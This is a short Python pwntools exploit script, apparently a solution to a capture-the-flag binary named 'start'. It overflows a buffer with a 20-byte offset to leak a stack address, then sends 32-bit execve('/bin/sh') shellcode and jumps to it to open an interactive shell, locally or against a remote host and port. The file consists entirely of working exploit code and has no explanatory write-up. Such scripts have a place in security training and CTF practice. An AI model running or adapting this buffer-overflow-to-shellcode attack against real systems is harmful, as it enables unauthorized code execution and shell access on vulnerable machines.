#!/usr/bin/python3
from pwn import *

# Switch between local/GDB/remote from terminal 
def initIO():
    if (args.REMOTE):   # ("server", port)
        return remote(sys.argv[1], sys.argv[2])
    else:               # Run locally
        return ELF.process()

# Set up the correct architecture for pwn
file = './start'
# Get context arch, bits, os, etc.
ELF = context.binary = ELF(file, checksec=False)
# Enable verbose logging
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = initIO()

stack_leak = 0x08048087

shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

offset = 20

io.recvuntil(b'CTF:')

payload = flat(
    b'A' * offset,
    stack_leak
)

io.send(payload)
esp_leak = u32(io.recv(4))

payload = flat(
    b'A' * offset,
    esp_leak + offset,
    shellcode
)

io.send(payload)

io.interactive()
